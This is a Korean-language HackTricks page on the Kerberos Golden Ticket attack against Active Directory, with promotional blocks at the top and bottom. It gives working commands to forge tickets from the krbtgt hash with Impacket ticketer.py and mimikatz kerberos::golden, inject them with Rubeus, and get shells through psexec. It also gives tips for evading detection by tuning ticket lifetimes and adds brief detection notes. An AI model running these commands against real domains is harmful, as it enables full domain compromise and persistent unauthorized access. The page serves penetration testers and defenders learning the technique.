# 골든 티켓

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기법을 공유**하세요.

</details>

## 골든 티켓

**골든 티켓(Golden Ticket)** 공격은 **Active Directory (AD) krbtgt 계정의 NTLM 해시**를 사용하여 **임의의 사용자를 표현하는 합법적인 Ticket Granting Ticket (TGT)를 생성**하는 것입니다. 이 기술은 특히 **피조물 사용자로서 도메인 내의 모든 서비스 또는 기기에 액세스**할 수 있기 때문에 매우 유리합니다. **krbtgt 계정의 자격 증명은 자동으로 업데이트되지 않는다는 점을 반드시 기억**해야 합니다.

krbtgt 계정의 NTLM 해시를 **획득**하기 위해 다양한 방법을 사용할 수 있습니다. 도메인 내의 **임의의 도메인 컨트롤러(DC)에 위치한 Local Security Authority Subsystem Service (LSASS) 프로세스** 또는 **NT Directory Services (NTDS.dit) 파일**에서 추출할 수 있습니다. 또한, **DCsync 공격을 실행**하여 이 NTLM 해시를 얻을 수도 있으며, Mimikatz의 **lsadump::dcsync 모듈**이나 Impacket의 **secretsdump.py 스크립트**와 같은 도구를 사용하여 수행할 수 있습니다. 이러한 작업을 수행하기 위해서는 일반적으로 **도메인 관리자 권한 또는 유사한 수준의 액세스 권한**이 필요합니다.

NTLM 해시는 이 목적을 위한 유효한 방법이지만, 운영 보안 상의 이유로 **고급 암호화 표준 (AES) Kerberos 키 (AES128 및 AES256)를 사용하여 티켓을 위조하는 것이 강력히 권장**됩니다.


{% code title="Linux에서" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Windows에서" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**골든 티켓을 주입한 후**에는 공유 파일 **(C$)**에 액세스하고 서비스 및 WMI를 실행할 수 있으므로 **psexec** 또는 **wmiexec**를 사용하여 셸을 얻을 수 있습니다 (winrm을 통해 셸을 얻을 수 없는 것 같습니다).

### 일반적인 탐지 우회

골든 티켓을 탐지하는 가장 흔한 방법은 **Kerberos 트래픽을 검사**하는 것입니다. 기본적으로 Mimikatz는 TGT를 10년 동안 서명하므로 이를 사용하여 수행되는 후속 TGS 요청에서 이상한 점으로 드러날 것입니다.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`, `/endin` 및 `/renewmax` 매개변수를 사용하여 시작 오프셋, 지속 시간 및 최대 갱신 횟수를 제어할 수 있습니다 (모두 분 단위).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
TGT의 수명은 4769에서 기록되지 않으므로 Windows 이벤트 로그에서 이 정보를 찾을 수 없습니다. 그러나 **이전 4768 없이 4769를 볼 수 있다면** 이를 연관시킬 수 있습니다. **TGT 없이 TGS를 요청하는 것은 불가능**하며, TGT 발급 기록이 없다면 오프라인에서 위조된 것으로 추론할 수 있습니다.

이 탐지를 **우회**하기 위해 다이아몬드 티켓을 확인하세요:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 완화 방법

* 4624: 계정 로그온
* 4672: 관리자 로그온
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

수비자가 할 수 있는 다른 작은 요령은 기본 도메인 관리자 계정과 같은 **민감한 사용자에 대한 4769 알림**입니다.

## 참고 자료
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>
